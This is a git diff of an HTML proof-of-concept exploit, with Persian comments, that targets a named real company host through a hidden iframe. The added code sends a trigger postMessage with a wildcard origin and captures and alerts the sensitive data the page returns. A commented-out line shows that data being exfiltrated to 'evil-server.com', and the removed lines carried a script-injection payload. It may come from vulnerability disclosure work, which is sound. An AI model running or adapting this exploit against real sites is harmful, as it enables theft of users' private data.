@@ -1,23 +1,51 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>PoC - Information Disclosure via postMessage</title>
+</head>
 <body>
+    <h2>🎣 اکسپلویت نشت اطلاعات از طریق postMessage 🎣</h2>
+    <p>لطفاً کنسول مرورگر (F12) را بررسی کنید تا داده‌های دزدیده شده را ببینید.</p>
+    
+    <iframe id="victimFrame" src="https://casers-dv1.geico.com/" style="width:1px; height:1px; border:none; visibility:hidden;"></iframe>
 
-<iframe id="v" src="https://casers-dv1.geico.com/"></iframe>
+    <script>
+        // آدرس iFrame هدف را در متغیر victim ذخیره می‌کنیم
+        var victim = document.getElementById("victimFrame").contentWindow;
 
-<script>
-  const iframe = document.getElementById("v");
+        // --- ۱. راه اندازی شنود کننده برای دریافت اطلاعات دزدیده شده ---
+        window.addEventListener("message", function(event) {
+            
+            // ما انتظار داریم Origin ما مورد حمله قرار گیرد، اما برای نمایش خوب است
+            // که همه چیز را لاگ کنیم.
+            console.log("--- پیام دزدیده شده (Captured Message) ---");
+            console.log("Origin فرستنده (احتمالاً سایت قربانی):", event.origin);
+            
+            try {
+                // نمایش اطلاعات حساس
+                var stolenData = JSON.parse(event.data);
+                console.log("✅ اطلاعات حساس دزدیده شده (JSON):", stolenData);
+                alert("SUCCESS! Data Stolen:\n" + event.data);
+                
+                // در یک حمله واقعی، اطلاعات به سرور مهاجم ارسال می‌شود
+                // fetch('https://evil-server.com/log?data=' + encodeURIComponent(event.data));
 
-  iframe.onload = () => {
-    iframe.contentWindow.postMessage(
-      JSON.stringify({ action: "<script>alert(origin)</script>" }),
-      "*"
-    );
-  };
+            } catch (e) {
+                console.log("Received non-JSON data or unexpected format.");
+            }
+        });
 
-  window.addEventListener("message", e => {
-    console.log("Captured data:", e.data);
-  });
-</script>
-
+        // --- ۲. ارسال پیام ماشه‌کش (Trigger) برای شروع حمله ---
+        document.getElementById("victimFrame").onload = function() {
+            console.log("هدف لود شد. ارسال پیام ماشه‌کش...");
+            
+            // این Payload دقیقاً همان چیزی است که کد آسیب‌پذیر انتظار دارد
+            var triggerPayload = JSON.stringify({ action: "Initialized" });
+            
+            // ما پیام را به iFrame ارسال می‌کنیم. استفاده از '*' در اینجا برای مهاجم مشکلی ندارد.
+            victim.postMessage(triggerPayload, "*"); 
+            console.log("Payload ارسال شد.");
+        };
+    </script>
 </body>
 </html>
